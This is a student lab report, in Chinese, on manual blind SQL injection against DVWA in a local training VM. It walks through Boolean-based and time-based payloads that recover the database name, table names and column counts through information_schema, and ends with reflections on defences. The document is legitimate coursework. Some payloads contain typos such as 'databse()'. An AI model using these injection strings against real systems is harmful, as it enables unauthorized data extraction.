# 《软件安全》实验报告

姓名：许洋   学号：2313721  班级：1070

## **实验名称：**

SQL盲注

##  **实验要求：**

基于DVWA里的SQL盲注案例，实施手工盲注，参考课本，撰写实验报告。

## **实验过程：**

### 环境配置

首先，我们从工具包中提取软件。然后将其解压，在`VM`虚拟机中打开即可。我们输入账号`root`和密码`owaspbwa`，输入命令行`ifconfig`，可以看到对应的网址，我们在自己的电脑上输入对应的网址，就可以进入系统了。![20250529-104634.504-9](D:\许洋计算机科学与技术\软件安全\作业\实验12\实验12\20250529-104634.504-9.jpg)

我们在浏览器中输入对应的网址：`192.168.19.133`，就可以进入到对应的页面了！![20250529-104634.504-18](D:\许洋计算机科学与技术\软件安全\作业\实验12\实验12\20250529-104634.504-18.jpg)

然后我们进行登录，选择`DVWA`（`Damn Vulnerable Web Application`）即可。账号和密码均为`admin`。![20250529-104634.504-6](D:\许洋计算机科学与技术\软件安全\作业\实验12\实验12\20250529-104634.504-6.jpg)

登录完之后进入到以下界面：![20250529-104634.504-5](D:\许洋计算机科学与技术\软件安全\作业\实验12\实验12\20250529-104634.504-5.jpg)

在左边选择`DVWA Security`，将等级设置为`low`。![20250529-104634.504-11](D:\许洋计算机科学与技术\软件安全\作业\实验12\实验12\20250529-104634.504-11.jpg)

### 基于布尔SQL盲注

布尔盲注：布尔盲注就是通过判断语句来猜解，如果判断条件正确则页面显示正常，否则报错。

#### 1. 判断是否存在注入，注入是字符型还是数字型

在这一部分，需要构造输入的指令判断注入类型，利用了下面几个语句：

输入 1：![20250529-104634.504-15](D:\许洋计算机科学与技术\软件安全\作业\实验12\实验12\20250529-104634.504-15.jpg)

结果：显示用户存在

输入 1' and 1=1 #![20250529-104634.504-17](D:\许洋计算机科学与技术\软件安全\作业\实验12\实验12\20250529-104634.504-17.jpg)

单引号为了闭合原来 SQL 语句中的第一个单引号，后面的#为了闭合后面的单引号。

结果：显示存在

输入 1' and 1=2 #![20250529-104634.504-16](D:\许洋计算机科学与技术\软件安全\作业\实验12\实验12\20250529-104634.504-16.jpg)

单引号和#的作用与上面一样。

结果：没有输出提示，说明不存在

从上面三个情景看出，当输入为字符串时，先用单引号结束原SQL查询语句，紧接着跟着and之后的语句，表示并集关系。当and之后的语句为false时，结果显示不存在；当and后为true，显示存在，说明明存在字符型的 SQL 盲注。

#### 2.  猜解当前数据库名

##### 2.1  猜解数据库名的长度

使用命令  `1' and length(database())=xxx #`

将xxx从1开始递增去尝试，直到显示存在，说明数据库名的长度就是当前xxx的值

当尝试到4的时候，有显示，说明数据库名长度为4。![20250529-104634.504-1](D:\许洋计算机科学与技术\软件安全\作业\实验12\实验12\20250529-104634.504-1.jpg)

##### 2.2   挨个猜解字符

由于我们只能通过“询问问题”，得到“是”或“不是”的回答，因此，在获取数据库名的时候，可以采用二分法提高效率：

```
 1' and ascii(substr(databse(),1,1))>97 #
 1' and ascii(substr(databse(),1,1))<122 #
 1' and ascii(substr(databse(),1,1))<109 #
 1' and ascii(substr(databse(),1,1))<103 #
```

结果显示存在，例如：![20250529-104634.504-2](D:\许洋计算机科学与技术\软件安全\作业\实验12\实验12\20250529-104634.504-2.jpg)

![20250529-104634.504-12](D:\许洋计算机科学与技术\软件安全\作业\实验12\实验12\20250529-104634.504-12.jpg)

![20250529-104634.504-13](D:\许洋计算机科学与技术\软件安全\作业\实验12\实验12\20250529-104634.504-13.jpg)

![20250529-104634.504-14](D:\许洋计算机科学与技术\软件安全\作业\实验12\实验12\20250529-104634.504-14.jpg)

直到输入`1' and ascii(substr(databse(),1,1))<100 #`我们发现没有显示，说明数据库的名称第一个字母的ascii码不小于100。我们尝试100到103的值。![20250529-104634.504-8](D:\许洋计算机科学与技术\软件安全\作业\实验12\实验12\20250529-104634.504-8.jpg)

出现输出，我们得到第一个字母的ascii码值，进一步验证一下发现确实是d。![20250529-104634.504-10](D:\许洋计算机科学与技术\软件安全\作业\实验12\实验12\20250529-104634.504-10.jpg)

之后重复这个操作得到完整的名称dvwa

#### 3.  **猜解数据库中的表名** 

##### 3.1	猜解数据库中表的数量

使用语句`1' and (select count (table_name) from information_schema.tables where table_schema=database())=xxx #`，不断从1递增遍历xxx的值，直到结果显示存在，说明此时的xxx就是表的数量，我们遍历到2的时候有结果，说明共有两个表![20250529-104634.504-4](D:\许洋计算机科学与技术\软件安全\作业\实验12\实验12\20250529-104634.504-4.jpg)

##### 3.2	猜解表名的长度

使用语句`1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=xxx #`，我们同样不断从1递增遍历xxx的值，直到结果显示存在，说明此时的xxx就是表名长度![20250529-104634.504-20](D:\许洋计算机科学与技术\软件安全\作业\实验12\实验12\20250529-104634.504-20.jpg)

##### 3.3	二分法猜测表名

与猜解数据库名相同，采用二分法，输入如下代码：

```
1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>97 # 显示存在

1' and ascii(substr((select table_name from information_schema.tables where 
table_schema=database() limit 0,1),1,1))<122 # 显示存在

1' and ascii(substr((select table_name from information_schema.tables where 
table_schema=database() limit 0,1),1,1))<109 # 显示存在

1' and ascii(substr((select table_name from information_schema.tables where 
table_schema=database() limit 0,1),1,1))<103 # 显示不存在

1' and ascii(substr((select table_name from information_schema.tables where 
table_schema=database() limit 0,1),1,1))>103 # 显示不存在
```

重复二分法可得两个表名为  `guestbook`  和  `users`  

#### 4.  猜解表中的字段名

##### 4.1	猜解表中字段的数量

遍历下面的代码发现，当遍历到6的时候，显示存在，其他都显示不存在，说明 users 表有 6 个字段。

```
1’ and (select count(column_name) from information_schema.columns where table_name= ’users’)=6 
```

##### 4.2	猜解字段名长度

遍历到7的时候，显示存在，其他都显示不存在，说明字段名长度为7。

```
1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7 
```

### 基于时间的SQL盲注

基于时间：在传入的语句设置条件延迟，若满足条件则会产生延迟。我们则根据执行这些语句时是否延迟来判断传入语句的正确性进行猜解。

我们尝试用这种方法猜解当前数据库名字长度：输入`1’ and if(length(database())=1,sleep(5),1)`时，没有明显延迟，而输入`1’ and if(length(database())=4,sleep(5),1) `时，产生了明显延迟。

![20250529-104634.504-3](D:\许洋计算机科学与技术\软件安全\作业\实验12\实验12\20250529-104634.504-3.jpg)说明数据库名字长度为4。

## **心得体会：**

## **心得体会：**

通过本次实验，我掌握了SQL盲注的核心原理与手工实现技巧，深刻认识到数据与代码混淆的风险。

学会了通过布尔逻辑（如 `1' AND 1=1#`）和时间延迟（如 `SLEEP(5)`）逐步猜解数据库名、表名及字段信息，并体会到二分法爆破字符的效率优势。

实验也让我意识到开发中必须严格使用参数化查询、过滤输入，并限制数据库权限，才能有效防御此类攻击。
